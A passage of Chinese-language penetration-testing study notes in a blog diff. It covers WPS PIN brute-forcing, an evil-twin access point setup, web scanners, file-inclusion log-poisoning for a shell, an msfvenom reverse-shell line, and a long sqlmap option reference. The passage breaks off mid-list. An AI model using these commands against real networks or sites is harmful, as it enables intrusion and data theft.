+<li>开始抓包并保存</li>
+<li>deauthentication攻击获取4步握手信息</li>
+<li>使用字典暴力破解</li>
+</ul>
+<p>密码破解工具</p>
+<ul>
+<li>airolib</li>
+<li>jtr</li>
+<li>cowpatty</li>
+<li>pyrit</li>
+</ul>
+<h4 id="WPS"><a href="#WPS" class="headerlink" title="WPS"></a>WPS</h4><p>通过PIN码简化无线接入操作，无需记住PSK</p>
+<p>PIN码是分为前后各4位的2段共8位数字</p>
+<p>安全漏洞</p>
+<ul>
+<li>接入发起方可根据路由器返回信息判断前4位是否正确</li>
+<li>pin码后4位只有1000种组合（最后一位是checksum）</li>
+<li>全部穷举要11000次尝试</li>
+<li>标准没有设计锁定机制，蛋厂家已实现锁定机制</li>
+</ul>
+<blockquote>
+<p>找到支持wps的ap</p>
+<p>wash -c -l wlan0mon</p>
+<p>airodump-ng wlan0mon –wps</p>
+<p>爆破pin码</p>
+<p>reaver -i wlan0mon -b AP的mac地址 -vv</p>
+<p>自动破解工具</p>
+<p>wifite</p>
+</blockquote>
+<h4 id="钓鱼攻击"><a href="#钓鱼攻击" class="headerlink" title="钓鱼攻击"></a>钓鱼攻击</h4><p>模拟免费无线路由，等受害者连接，进行抓包，也可以修改dns解析，将正常请求指向我们准备的陷阱。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">airbase-ng -c qq --essid name wlan2mon   模拟AP</span><br><span class="line">apt-get install bridge-utils</span><br><span class="line">brctl addbr bridge    创建网桥</span><br><span class="line">brctl addif eth0      添加网桥地址</span><br><span class="line">brctl addif at0				添加网桥地址</span><br><span class="line">ifconfig eth0 0.0.0.0 up 启动eth0 但是不能有地址，地址要分配给bridge</span><br><span class="line">ifconfig at0 0.0.0.0 up</span><br><span class="line">ifconfig bridge 192.168.1.10 up</span><br><span class="line">route add -net 0.0.0.0 netmask 0.0.0.0 gw 192.168.1.1</span><br></pre></td></tr></table></figure>
+
+<p>工具：</p>
+<ul>
+<li><p>3vilTwinAttacker</p>
+<ul>
+<li>恶意AP钓鱼</li>
+</ul>
+</li>
+<li><p>hostpad</p>
+<ul>
+<li>恶意AP钓鱼</li>
+</ul>
+</li>
+<li><p>asleap</p>
+<ul>
+<li>破解密码</li>
+</ul>
+</li>
+<li><p>Airdecap-ng</p>
+<ul>
+<li>去除802.11头</li>
+<li>解密WEP加密数据<ul>
+<li>必须有与AP建立关联关系</li>
+</ul>
+</li>
+<li>解密WPA加密数据<ul>
+<li>抓包文件必须包含4步握手信息</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>airserv-ng</p>
+<ul>
+<li>通过网络提供无线网卡服务器</li>
+<li>启动无线侦听</li>
+</ul>
+</li>
+<li><p>airtun-ng</p>
+<ul>
+<li>无线入侵检测wlDS</li>
+<li>中继和重放</li>
+</ul>
+</li>
+<li><p>bessid-ng</p>
+<ul>
+<li>抓包上传服务器进行在线破解</li>
+</ul>
+</li>
+<li><p>kismet</p>
+</li>
+</ul>
+<h2 id="WEB渗透"><a href="#WEB渗透" class="headerlink" title="WEB渗透"></a>WEB渗透</h2><h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><h4 id="web攻击面"><a href="#web攻击面" class="headerlink" title="web攻击面"></a>web攻击面</h4><ul>
+<li>network</li>
+<li>os</li>
+<li>web server</li>
+<li>app server</li>
+<li><strong>web application</strong></li>
+<li><strong>database</strong></li>
+<li>browser</li>
+</ul>
+<h3 id="WEB工具"><a href="#WEB工具" class="headerlink" title="WEB工具"></a>WEB工具</h3><h4 id="nikto"><a href="#nikto" class="headerlink" title="nikto"></a>nikto</h4><p>WEB扫描器</p>
+<p>原理：向目标发包，根据返回包类型和内容进行判断</p>
+<ul>
+<li>404扫描<ul>
+<li>返回值400，资源不存在</li>
+<li>返回值200，提取关键字判断资源是否存在</li>
+<li>可以对比返回的数据包内容</li>
+</ul>
+</li>
+</ul>
+<h4 id="slowhttptest"><a href="#slowhttptest" class="headerlink" title="slowhttptest"></a>slowhttptest</h4><p>HTTP应用层拒绝服务攻击工具</p>
+<ul>
+<li>利用低带宽慢速度拒绝服务（HTTP SYN）</li>
+<li>原理<ul>
+<li>大量小号目标连接池</li>
+<li>缓慢发送不完整的HTTP请求，服务器等待并保持连接</li>
+<li>slowloris：http请求头只发送一个\r\n</li>
+<li>slowPOST：content-lengeh声明长度，但body部分缓慢发送</li>
+<li>range：向服务器发送恶意range请求范围</li>
+<li>slowread：慢速请求接受服务器返回数据</li>
+</ul>
+</li>
+</ul>
+<h4 id="apache-user"><a href="#apache-user" class="headerlink" title="apache-user"></a>apache-user</h4><p>通过枚举发现apache服务器的用户账号</p>
+<h4 id="arachni"><a href="#arachni" class="headerlink" title="arachni"></a>arachni</h4><p>功能全面、模块化、高性能、基于ruby的扫描架构</p>
+<p>扫描器衡量标准</p>
+<ul>
+<li>爬行覆盖面</li>
+<li>漏洞检测能力</li>
+</ul>
+<h4 id="bbqsql"><a href="#bbqsql" class="headerlink" title="bbqsql"></a>bbqsql</h4><p>针对与sql盲注</p>
+<h4 id="blindElephant"><a href="#blindElephant" class="headerlink" title="blindElephant"></a>blindElephant</h4><p>信息收集，用于发现开发架构CMS</p>
+<ul>
+<li>发现目标版本</li>
+<li>基于对固定位置静态文件的HASH对比</li>
+<li>支持对插件版本的发现</li>
+</ul>
+<h4 id="cadaber-x2F-davtest"><a href="#cadaber-x2F-davtest" class="headerlink" title="cadaber&#x2F;davtest"></a>cadaber&#x2F;davtest</h4><blockquote>
+<p>webDAV</p>
+<ul>
+<li>web-based distributed authoring and versioning</li>
+</ul>
+<p>基于HTTP 1.1的PUT方法</p>
+<p>自定义身份验证机制</p>
+<p>基于单一TCP链接通信</p>
+<p>结合SSL实现传输安全</p>
+<p>实现功能强大的内容管理</p>
+</blockquote>
+<p><strong>davtest</strong></p>
+<p>测试webdav目录写入，及是否可执行</p>
+<p>自动向指定url上传各种语言类型的dav测试文件，反馈可执行的语言</p>
+<p><strong>cadaver</strong><br>可上传指定文件</p>
+<p>生成反弹shell的方法：<code>smfvenom -p php/meterpreter/reverse_tcp lhost=IP lport=prot</code></p>
+<h4 id="cutycapt"><a href="#cutycapt" class="headerlink" title="cutycapt"></a>cutycapt</h4><p>将WEB页面保存为图片，页面自动抓取工具，可辅助自建安全系统的监控和报告功能</p>
+<h4 id="whatweb"><a href="#whatweb" class="headerlink" title="whatweb"></a>whatweb</h4><p>web服务器端信息扫描</p>
+<ul>
+<li>服务器地址</li>
+<li>cookies名称</li>
+<li>服务器软件版本</li>
+<li>开发架构、语言环境</li>
+<li>title及特殊头部</li>
+</ul>
+<h4 id="uniscan"><a href="#uniscan" class="headerlink" title="uniscan"></a>uniscan</h4><p>WEB扫描器：服务器版本、地址、方法、404检测、备份文件、信息泄露、WEB服务、爬虫、漏洞检测、whois、路径追踪、域名解析、nmap端口及服务漏洞扫描、爬站手机邮箱地址、web性能压力测试、搜索引擎信息收集</p>
+<h4 id="burpsuite"><a href="#burpsuite" class="headerlink" title="burpsuite"></a>burpsuite</h4><blockquote>
+<p>正常请求发包和配置代理服务器发包的区别：在包的第一行<code>GET / HTTP1.0</code>变为<code>GET http://ip/ HTTP1.0</code>代理服务器转发前只查看第一行，ip地址知否可发送。</p>
+</blockquote>
+<ul>
+<li><p>sequencer<br>  分析序列，cookie、令牌等</p>
+</li>
+<li><p>collaborator</p>
+<ul>
+<li>对于无法直接发现的漏洞，通过payload出发W与C服务器交互</li>
+<li>W DNS解析、HTTP请求发给C</li>
+<li>B定期轮询访问C，获取结果</li>
+</ul>
+</li>
+<li><p>infiltrator</p>
+<ul>
+<li>部署在服务器端，注入hook指令，发现存在风险的API调用</li>
+<li>不可逆的修改服务端字节码文件</li>
+<li>会造成性能、稳定性、通信质量、信息泄露等问题</li>
+<li><strong>只适合在测试服务器使用</strong></li>
+</ul>
+</li>
+<li><p>clickbandit</p>
+<ul>
+<li>测试点击解除漏洞的客户端脚本</li>
+</ul>
+</li>
+</ul>
+<h4 id="ua-tester"><a href="#ua-tester" class="headerlink" title="ua-tester"></a>ua-tester</h4><ul>
+<li>检测web可以接受那些user-agent字段</li>
+<li>探测服务器是否一句ua过滤</li>
+<li>使用内建ua字典测试服务器的反应</li>
+</ul>
+<h4 id="grabber"><a href="#grabber" class="headerlink" title="grabber"></a>grabber</h4><ul>
+<li>面向小型WEB应用的扫描器<ul>
+<li>不支持身份认证</li>
+</ul>
+</li>
+</ul>
+<h3 id="路径扫描"><a href="#路径扫描" class="headerlink" title="路径扫描"></a>路径扫描</h3><h4 id="dirb"><a href="#dirb" class="headerlink" title="dirb"></a>dirb</h4><blockquote>
+<p>衡量web扫描器的两个指标</p>
+<ul>
+<li>爬网范围</li>
+<li>漏洞检测</li>
+</ul>
+</blockquote>
+<p>命令行</p>
+<h4 id="dirb-gendict"><a href="#dirb-gendict" class="headerlink" title="dirb-gendict"></a>dirb-gendict</h4><p>按需要生成字典</p>
+<h4 id="dirbuster"><a href="#dirbuster" class="headerlink" title="dirbuster"></a>dirbuster</h4><p>GUI</p>
+<h4 id="gibuster"><a href="#gibuster" class="headerlink" title="gibuster"></a>gibuster</h4><h3 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h3><p>文件包含漏洞绕过</p>
+<ul>
+<li>本地文件包含漏洞<ul>
+<li>编码<ul>
+<li>url编码</li>
+<li>多层url编码</li>
+<li>encode编码</li>
+</ul>
+</li>
+<li>空字符截断:有些服务器会在请求末尾自动添加后缀如<code>.php</code>，通过00截断，绕过后缀</li>
+<li>点号截断：windows长度最长256，通过输入超过256个<code>.</code>绕过后缀</li>
+<li>长路径截断</li>
+<li>....\</li>
+<li>php:&#x2F;&#x2F;filter</li>
+<li>data:&#x2F;&#x2F;</li>
+</ul>
+</li>
+<li>获取shell<ul>
+<li>php:&#x2F;&#x2F;input #POST方法</li>
+<li>file:&#x2F;&#x2F;&#x2F;proc&#x2F;shef&#x2F;environ<ul>
+<li>返回解析user-agent，将user-agent修改实现注入</li>
+</ul>
+</li>
+<li>通过系统日志获取shell<ul>
+<li>file:&#x2F;&#x2F;&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log<ul>
+<li>所有请求的日志都会保存在access.log</li>
+</ul>
+</li>
+<li>file:&#x2F;&#x2F;&#x2F;var&#x2F;log&#x2F;apache2&#x2F;error.log<ul>
+<li>出错的请求日志都会保存在error.log</li>
+</ul>
+</li>
+<li>将payload写入请求头，使用文件包含漏洞包含日志，实现包含payload</li>
+<li>通过nc发起错误的请求，将payload写入日志</li>
+<li>需要读权限，日志默认只有root有读写权限</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>远程文件包含<ul>
+<li>&#x2F;etc&#x2F;php5&#x2F;cgi&#x2F;php.ini<ul>
+<li>allow_url_include&#x3D;On</li>
+<li>allow_url_fopen&#x3D;On</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="fimap"><a href="#fimap" class="headerlink" title="fimap"></a>fimap</h4><p>自动检测文件包含漏洞，返回一个shell</p>
+<h4 id="vega"><a href="#vega" class="headerlink" title="vega"></a>vega</h4><blockquote>
+<p>WEB扫描器</p>
+<ul>
+<li>截断代理方式</li>
+<li>主动扫描模式</li>
+</ul>
+</blockquote>
+<p>使用方式</p>
+<ul>
+<li>基本参数设置</li>
+<li>代理手动爬网</li>
+<li>自动漏洞扫描</li>
+<li>人工漏洞挖掘</li>
+<li>https代理证书</li>
+</ul>
+<p><strong>GUI</strong></p>
+<h4 id="jboss-autopwn"><a href="#jboss-autopwn" class="headerlink" title="jboss-autopwn"></a>jboss-autopwn</h4><blockquote>
+<p>Jboss AS是一个开源j2EE应用服务器</p>
+<p>jboss早期版本默认配置存在漏洞<br>jboss-autopwn利用配置漏洞注入jsp shell</p>
+</blockquote>
+<ul>
+<li>纯shell脚本<ul>
+<li>jboss-windows</li>
+<li>jboss-linux</li>
+</ul>
+</li>
+<li>依赖<code>metasploit</code>、<code>nc</code>、<code>curl</code><ul>
+<li>由mwtasploit注入payload获取shell</li>
+</ul>
+</li>
+<li>jboss-autopwn：2011年停止维护<ul>
+<li>metasploit也修改，无法直接使用jboss</li>
+</ul>
+</li>
+</ul>
+<h3 id="命令注入漏洞"><a href="#命令注入漏洞" class="headerlink" title="命令注入漏洞"></a>命令注入漏洞</h3><p>2013 OWASP TOP10 第一名</p>
+<p>程序可以调用系统命令实现某些功能</p>
+<p>硬件设备容易存在命令注入</p>
+<ul>
+<li>基于结果的命令注入<ul>
+<li>基于结果的经典命令注入<ul>
+<li>程序将注入命令结果直接返回</li>
+</ul>
+</li>
+<li>动态代码评估技术<ul>
+<li>漏洞程序利用eval（）函数，运行时动态执行注入代码</li>
+<li>java、javascript、python、perl、php等解释型余元都有eval函数</li>
+<li>执行要执行的代码</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>盲注<ul>
+<li>程序不输出命令注入结果</li>
+<li>基于时间的盲注</li>
+<li>基于文件的盲注</li>
+<li>访问指定页面的盲注</li>
+</ul>
+</li>
+</ul>
+<h4 id="commix"><a href="#commix" class="headerlink" title="commix"></a>commix</h4><p>支持全平台全操作系统工具</p>
+<p><strong>命令注入漏洞工具</strong></p>
+<p>三个模块</p>
+<ul>
+<li><p>向量申城模块</p>
+</li>
+<li><p>漏洞检测模块</p>
+</li>
+<li><h2 id="漏洞利用模块-利用metasploit完成"><a href="#漏洞利用模块-利用metasploit完成" class="headerlink" title="漏洞利用模块  - 利用metasploit完成"></a>漏洞利用模块<br>  - 利用metasploit完成</h2></li>
+<li><p>前缀</p>
+<ul>
+<li>实现绕过服务器不严格的检测</li>
+</ul>
+</li>
+<li><p>服务器 shell 受限</p>
+<ul>
+<li>使用其他shell：python shell</li>
+<li>python命令</li>
+</ul>
+</li>
+</ul>
+<h4 id="joomscan-x2F-wpscan-x2F-plecost"><a href="#joomscan-x2F-wpscan-x2F-plecost" class="headerlink" title="joomscan&#x2F;wpscan&#x2F;plecost"></a>joomscan&#x2F;wpscan&#x2F;plecost</h4><blockquote>
+<p>很多网站使用CMS搭建</p>
+<p>一个有洞，全家遭殃</p>
+</blockquote>
+<h5 id="joomscan"><a href="#joomscan" class="headerlink" title="joomscan"></a>joomscan</h5><p>OWASP开发的开源joomla漏洞扫描器</p>
+<ul>
+<li>最好的joomla漏洞扫描全歼</li>
+<li>prol语言开发</li>
+</ul>
+<h5 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h5><p>双重许可的wordpress检查器</p>
+<p>商业用途需付费</p>
+<h5 id="plecost"><a href="#plecost" class="headerlink" title="plecost"></a>plecost</h5><p>基于字典枚举wordpress中安装的插件</p>
+<p>wordpress漏洞基本完善了，插件可能存在漏洞</p>
+<h4 id="skipfish"><a href="#skipfish" class="headerlink" title="skipfish"></a>skipfish</h4><p>谷歌开发，C语言编写的主动web扫描器</p>
+<ul>
+<li>爬网<ul>
+<li>递归</li>
+<li>字典</li>
+</ul>
+</li>
+<li>扫描</li>
+</ul>
+<h4 id="wapiti"><a href="#wapiti" class="headerlink" title="wapiti"></a>wapiti</h4><p><strong>准确性相当高</strong></p>
+<p>黑盒WEB扫描器</p>
+<ul>
+<li>爬网</li>
+<li>注入</li>
+<li>报告</li>
+</ul>
+<p>检测漏洞</p>
+<ul>
+<li>sqli、xss、fi、exec、xxe、crlf、shellshock</li>
+<li>搜索潜在危险文件</li>
+<li>搜索备份文件</li>
+<li>路径爆破</li>
+<li>支持get\post方法</li>
+</ul>
+<h4 id="jsql"><a href="#jsql" class="headerlink" title="jsql"></a>jsql</h4><p>java编写的轻量型<strong>图形化</strong>sqli工具</p>
+<p>功能</p>
+<ul>
+<li>支持多种http方法</li>
+<li>基于标准、错误、时间、等注入方法</li>
+<li>支持多种数据库</li>
+<li>定制HTTP头</li>
+<li>支持代理、HTTP身份认证、检查逃逸</li>
+<li>社区</li>
+</ul>
+<p>sqli</p>
+<ul>
+<li>DB内容提取</li>
+<li>管理页面爆破</li>
+<li>文件读写</li>
+<li>web shell、sql shell</li>
+<li>密码爆破</li>
+<li>编码转换、hash计算</li>
+<li>批量url检测</li>
+</ul>
+<h4 id="paros"><a href="#paros" class="headerlink" title="paros"></a>paros</h4><p>web应用程序</p>
+<p>截断代理类WEB安全检查工具的先行者</p>
+<h4 id="funkload"><a href="#funkload" class="headerlink" title="funkload"></a>funkload</h4><p>python编写的web项目测试工具套件</p>
+<ul>
+<li>功能&#x2F;回归测试</li>
+<li>基线测试（benchmark）<ul>
+<li>性能测试</li>
+<li>负载测试</li>
+<li>压力测试</li>
+</ul>
+</li>
+<li>生成报告</li>
+</ul>
+<p>支持多种方法、身份认证、内容类型、上传文件、数据提交、自定义cookie、自定义HTTP头、HTTPS、代理、模拟浏览器缓存、获取静态页面元素</p>
+<p>运行方式</p>
+<ul>
+<li>命令行</li>
+<li>测试脚本+配置文件</li>
+</ul>
+<p>支持分布式，多个主机一起测同一服务器</p>
+<p>credential server：测试账号</p>
+<p>监视服务器：必须运行在目标服务器上</p>
+<blockquote>
+<p>测试</p>
+<p>page：一个web页面，包含重定向、img、css、js等</p>
+<p>test：setup-page1-….-teardown</p>
+<p>cycle：多线程test</p>
+</blockquote>
+<h4 id="OWASP-ZAP"><a href="#OWASP-ZAP" class="headerlink" title="OWASP-ZAP"></a>OWASP-ZAP</h4><p>代理工具，综合web安全检查工具</p>
+<p>基于java开源免费</p>
+<p>主动扫描&#x2F;截断代理</p>
+<ul>
+<li>代理端口 8080</li>
+<li>手动爬网、自动爬网、ajax爬网、字典爆破</li>
+<li>定制扫描策略、警告级别</li>
+<li>fuzz</li>
+<li>API</li>
+</ul>
+<p>session</p>
+<ul>
+<li>相当于环境配置</li>
+</ul>
+<p>可以安装插件</p>
+<p>扫描</p>
+<ul>
+<li>被动爬网</li>
+<li>主动爬网</li>
+<li>暴力遍历（字典）</li>
+</ul>
+<p>扫描模式</p>
+<ul>
+<li>safe mode</li>
+<li>protected mode（只扫描加入default context的路径）</li>
+<li>ATTACK mode（破坏性扫描）</li>
+<li>standard mode</li>
+</ul>
+<p>工作过程</p>
+<ul>
+<li>设置代理</li>
+<li>手动爬网</li>
+<li>自动爬网</li>
+<li>自动扫描</li>
+<li>手动验证</li>
+</ul>
+<h4 id="padbuster"><a href="#padbuster" class="headerlink" title="padbuster"></a>padbuster</h4><p>加密算法漏洞利用</p>
+<p>padding oracle attacks</p>
+<ul>
+<li>加密填充</li>
+<li>pkcs5是终端padding标准中应用最多的</li>
+</ul>
+<p>数据经过加密后，的验证，使用起始向量，和明文做亦或运算，得到0x位数，则验证通过，经过穷举测试，该位正确的初始向量和错误的初始向量服务器会返回不同的响应值，由此可判断出正确的初始向量，又知道亦或结果，可推出明文</p>
+<p><strong>由服务器反馈不同，判断明文内容</strong></p>
+<h4 id="httrack"><a href="#httrack" class="headerlink" title="httrack"></a>httrack</h4><p>在线侦察容易被目标发现，下载目标全站到本地离线分析</p>
+<p>httrack离线下载站点工具</p>
+<ul>
+<li>下载了解目标站点结构</li>
+</ul>
+<h4 id="deblaze"><a href="#deblaze" class="headerlink" title="deblaze"></a>deblaze</h4><p>针对adobe的flex框架编程</p>
+<p>adobe实现flex变成</p>
+<ul>
+<li>客户端SWF文件+服务端AMF网关</li>
+<li>工作协议AMF</li>
+<li>通过actionScrite语言格式RPC信息</li>
+<li>序列化（服务、方法、参数）成二进制包进行传递</li>
+<li>性能比基于文本的传输格式高10倍以上</li>
+<li>通过HTTP&#x2F;HTTPS&#x2F;RTMP&#x2F;RTMPS协议传输</li>
+</ul>
+<p>安全风险</p>
+<ul>
+<li>服务、方法、参数名不区分大小写（容易枚举爆破）</li>
+<li>一旦掌握服务、方法、参数名称即可注入测试</li>
+</ul>
+<h4 id="owasp-mantra-ff"><a href="#owasp-mantra-ff" class="headerlink" title="owasp-mantra-ff"></a>owasp-mantra-ff</h4><p>基于浏览器的安全测试工具</p>
+<ul>
+<li>信息收集<ul>
+<li>DNS解析</li>
+<li>IP解析</li>
+<li>WHOIS</li>
+</ul>
+</li>
+<li>network</li>
+<li>加密</li>
+<li>查看web要素</li>
+<li>代理</li>
+<li>ssh</li>
+<li>temper data（请求历史）</li>
+<li>hackbar</li>
+<li>cookie manager</li>
+</ul>
+<h4 id="webscarab"><a href="#webscarab" class="headerlink" title="webscarab"></a>webscarab</h4><p>早已停止维护</p>
+<p>截断代理型web安全检查工具</p>
+<h4 id="websploit"><a href="#websploit" class="headerlink" title="websploit"></a>websploit</h4><p>基于python开发</p>
+<p>模仿metasploit，调用metasploit模块，疏于维护，部分模块已失效，并非针对web漏洞</p>
+<h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><p>python编写，检查发现sql注入，利用漏洞</p>
+<p>指纹发现、脱裤、OS控制、RCE、发现XSS</p>
+<p>可以和burpsuite配合，读取burp日志，结合google自动搜索执行检查</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"># 直接榨取所有数据</span><br><span class="line">sqlmap -d &quot;url&quot; -f --users -b --dbs --schema -a -v 6</span><br><span class="line"></span><br><span class="line">-f				# footpoint</span><br><span class="line">-b				# banner</span><br><span class="line">-a				# 榨取所有数据</span><br><span class="line">-v				# 输出信息详细版</span><br><span class="line">-u				# url</span><br><span class="line">-m				# url列表</span><br><span class="line">-g				# google搜索</span><br><span class="line"></span><br><span class="line">-r				# 请求文件（POST）</span><br><span class="line">--data			# post请求内容</span><br><span class="line">--param-del=	# post请求内容分割符</span><br><span class="line">--method		# 指定HTTP方法</span><br><span class="line">-l				# 读取burp日志</span><br><span class="line">-x				# 搜索引擎</span><br><span class="line">--force-ssl		# 使用ssl链接</span><br><span class="line"></span><br><span class="line">--cookie=		# 设定cookie</span><br><span class="line">--cookie-del=	# cookie分隔符</span><br><span class="line">--drop-set-cookie	# 禁用服务器set-cookie头</span><br><span class="line">--load-cookies=		# 读取cookie文件</span><br><span class="line">-level&gt;=2		# 检查cookie注入点</span><br><span class="line"></span><br><span class="line">--user-agent	# UA头文件（level&gt;=3）</span><br><span class="line">--random-agent	# 随机oUA</span><br><span class="line">--host			# 指定HOST头（level=5）</span><br><span class="line">--referer		# 指定referer（level&gt;=3）</span><br><span class="line">--headers		# 指定其他头</span><br><span class="line"></span><br><span class="line">--auth-type		# 身份认证类型</span><br><span class="line">--auth-cred		# username:password</span><br><span class="line">--auth-file		# 客户端私钥证书PEM文件</span><br><span class="line">--ignore-401	# 忽略认证失败</span><br><span class="line"></span><br><span class="line">--proxy			# http://url:prot</span><br><span class="line">--proxy-cred	# username:password</span><br><span class="line">--proxy-file	# 代理服务器列表</span><br><span class="line">--ignore-proxy	# 忽略系统级代理</span><br><span class="line"></span><br><span class="line">--tor			# 使用tor匿名网络</span><br><span class="line">--tor-prot		# 9050/9150</span><br><span class="line">--tor-type		# socks5、socks4、http</span><br><span class="line">--check-tor		# 检查tor网络链接</span><br><span class="line"></span><br><span class="line">--delay			# 每请求间延迟</span><br><span class="line">--timeout		# 超市时间</span><br><span class="line">--retries		# 重试次数</span><br><span class="line">--randomize		# 每随机取值的参数</span><br><span class="line"></span><br><span class="line">--scope			# 筛选代理日志</span><br><span class="line">--safe-url/--safe-post/--safe-req/--safe-freq	# 重试多次错误请求后，发送一次正确请求  有一些网站在连续收到多次错误请求后会封IP</span><br><span class="line">--skip-urlencode	# 服务器要求url未编码</span><br><span class="line">--csrf-token/--csrf-url	# 绕过anti-CSRF</span><br><span class="line">--eval			# 自动验签</span><br><span class="line">--predict-output	# 对返回结果匹配预设输出表，提高检测效率</span><br><span class="line">					# 版本名、用户名、数据库名、表名、列名</span><br><span class="line">					# 与--threads不兼容</span><br><span class="line">--keep-alive		# http长连接，不兼容--proxy</span><br><span class="line">--null-connection	# 通过响应判断真假，适用于盲注</span><br><span class="line">-o					# 以上三个参数全部</span><br><span class="line">--threads			# 最大并发请求数10</span><br><span class="line"></span><br><span class="line">-p/--skip			# 指定/忽略注入检查的参数</span><br><span class="line">http://url/param1/value1/param2/value2			# 部分服务器将参数写成路径格式</span><br><span class="line">--dbms				# 指定数据库类型</span><br><span class="line">--os				# 指定操作系统</span><br><span class="line">--invalid-bignum/--invalid-logical/--invalid-string				# 取错值</span><br><span class="line">--no-cast			# 老版本需要关闭cast功能</span><br><span class="line">--no-escape			# 禁用字符编码转义</span><br><span class="line">--prefix/--suffix	# 前缀/后缀</span><br><span class="line">--temper=			# 混淆payload</span><br><span class="line">--level				# 检查等级</span><br><span class="line">--risk				# 风险1-4</span><br><span class="line">--string/--not-string/--regexp/--code/--text-only/--titles		# 指定盲注判断真假的依据来源</span><br><span class="line"></span><br><span class="line"># 注入技术</span><br><span class="line">--technique</span><br><span class="line">B：Boolean-based blind</span><br><span class="line">E：Error-based</span><br><span class="line">U：Union query-based</span><br><span class="line">S：stacked queries（文件系统、操作系统、注册表）</span><br><span class="line">T：Time-based blind</span><br><span class="line">Q：Inline queries</span><br><span class="line"></span><br><span class="line">--time-sec			# 基于时间盲注的延迟响应时间（默认5s）</span><br><span class="line">--union-cols		# 指定联合查询列范围（默认1-10）</span><br><span class="line">--union-char		# 联合查询中指定替代NULL的字符</span><br><span class="line">--union-from		# 联合查询时指明表名</span><br><span class="line">--dns-domain		# 仅适用于基于时间的盲注</span><br><span class="line">--second-orfer		# A页面注入，B页面反应结果</span><br><span class="line"></span><br><span class="line">-T 表名 -D 数据库名 -C 列名 --solumns --search</span><br><span class="line">--schema			数据库所有数据表</span><br><span class="line">--exclude-sysdbs	用户数据表</span><br><span class="line">--count/--dump/--start --stop/ --first/--last/--where=</span><br><span class="line">--dump-all </span><br><span class="line">--sql-query/--sql-shell		# 执行任何sql语句</span><br><span class="line">--commom-tables/--common-columns	# 字典爆破</span><br><span class="line">--udf-inject/--shared-lib	# Mysql/postgreSQL</span><br><span class="line"></span><br><span class="line">--file-read=</span><br><span class="line">--file-write=“写入的文件” --file-dest “写入路径”</span><br><span class="line"></span><br><span class="line">--os-cmd/--os-shell/--sql-shell 通过将命令写入文件执行，返回一个shell</span><br><span class="line"></span><br><span class="line"># 注册表</span><br><span class="line">--reg-read/--reg-add/--reg-del</span><br><span class="line">--reg-key/--reg-value/--reg-data/--reg-type</span><br><span class="line"></span><br><span class="line">-s				# 指定会话保存位置</span><br><span class="line">-t				# 流量文件保存位置</span><br><span class="line">--batch/--answers		# 批处理（默认选项）/指定每次提问答案</span><br><span class="line">--charset		# content-type</span><br><span class="line">--crawl/--crawl-exclude	# 